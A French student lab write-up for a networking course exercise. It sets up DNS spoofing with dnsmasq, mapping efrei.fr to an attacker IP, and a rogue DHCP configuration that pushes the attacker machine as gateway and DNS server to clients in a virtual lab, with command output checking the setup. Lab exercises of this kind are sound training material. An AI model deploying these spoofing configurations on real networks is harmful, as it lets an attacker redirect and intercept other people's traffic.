# TP2 Part4 : Alors koa c tou ? On refé just la mem choz ke o tp1 enfet enfet ? Bah non¶

### 1. Go for it
A. Setup
Deeeeeeeeeeeeeeeee toute évidence, tout est à réaliser sur la machine attaquante.

🌞 Préparer le DNS spoof

créer un fichier /tmp/spoofed_hosts avec le contenu :

<ATTACKER_IP> efrei.fr
Note
créer un /tmp/dnsmasq.conf avec le contenu suivant :

interface=<INTERFACE>
listen-address=<ATTACKER_IP>
port=53
no-hosts
addn-hosts=/tmp/dns_spoof_hosts
no-resolv
server=1.1.1.1
server=8.8.8.8
lancer dnsmasq a la manooo dans un shell avec :

dnsmasq -C /tmp/dnsmasq.conf -q &
Tip
Pour rappel, le caractère & en fin de ligne dans un shell Linux permet de lancer une commande en tâche de fond.
Vous pouvez ensuite voir les process qui ont été lancés ainsi, en tâche de fond, avec la commande jobs.

B. Vérification
🌞 S'assurer que c'est up & running, on en profite pour réviser un peu de shell
```
[redz@atk ~]$ jobs
[1]+  Stopped                 sudo dnsmasq -C /tmp/dnsmasq.conf -q
```

```
[redz@atk ~]$ jobs
[1]+  Stopped                 sudo dnsmasq -C /tmp/dnsmasq.conf -q
[redz@atk ~]$ ps -ef | grep dnsmasq
dnsmasq     2485       1  0 14:50 ?        00:00:00 /usr/sbin/dnsmasq
root        2608    2197  0 15:02 pts/2    00:00:00 sudo dnsmasq -C /tmp/dnsmasq.conf -q
redz        2622    2197 12 15:02 pts/2    00:00:00 grep --color=auto dnsmasq
```
```
[redz@atk ~]$ dig @1.1.1.1 efrei.fr

; <<>> DiG 9.18.33 <<>> @1.1.1.1 efrei.fr
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 29016
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1472
;; QUESTION SECTION:
;efrei.fr.                      IN      A

;; ANSWER SECTION:
efrei.fr.               1328    IN      A       51.210.229.203

;; Query time: 2845 msec
;; SERVER: 1.1.1.1#53(1.1.1.1) (UDP)
;; WHEN: Thu Jan 08 15:16:49 CET 2026
;; MSG SIZE  rcvd: 53
```

```
[redz@atk ~]$ dig @127.0.0.1 efrei.fr

; <<>> DiG 9.18.33 <<>> @127.0.0.1 efrei.fr
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34789
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;efrei.fr.                      IN      A

;; ANSWER SECTION:
efrei.fr.               0       IN      A       10.2.1.137

;; Query time: 0 msec
;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)
;; WHEN: Thu Jan 08 15:16:21 CET 2026
;; MSG SIZE  rcvd: 53
```

C. Hax ?
🌞 Relance ton attaque DHCP spoof depuis la machine attaquante
```
interface=enp0s3
bind-interfaces
dhcp-range=10.2.1.201,10.2.1.250,12h
dhcp-option=3,10.2.1.137
dhcp-option=6,10.2.1.137
dhcp-authoritative
```
🌞 Test test test : ajouter un nouveau VPCS au LAN1, le bro node7.tp2.efrei

```
PC7> ip dhcp
DORA IP 10.2.1.166/24 GW 10.2.1.254

PC7> show

NAME   IP/MASK              GATEWAY           MAC                LPORT  RHOST:PORT
PC7    10.2.1.166/24        10.2.1.254        00:50:79:66:68:06  10027  127.0.0.1:10028
       fe80::250:79ff:fe66:6806/64

PC7> ping efrei.fr
efrei.fr resolved to 51.210.229.203
84 bytes from 51.210.229.203 icmp_seq=1 ttl=253 time=41.636 ms
84 bytes from 51.210.229.203 icmp_seq=2 ttl=253 time=25.453 ms
84 bytes from 51.210.229.203 icmp_seq=3 ttl=253 time=36.890 ms
84 bytes from 51.210.229.203 icmp_seq=4 ttl=253 time=55.606 ms
84 bytes from 51.210.229.203 icmp_seq=5 ttl=253 time=37.159 ms
```

➜ WIRESHARK

lance Wireshark sur la machine attaquante
capturer le trafic quand node7 fait un ping efrei.fr
📁 part4_dns_spoof.pcap, on doit y voir :

la requête DNS du client
la réponse de votre DNS malveillant
le ping qui part vers votre machine attaquante (genre l'IP de destination c'est la machine attaquante).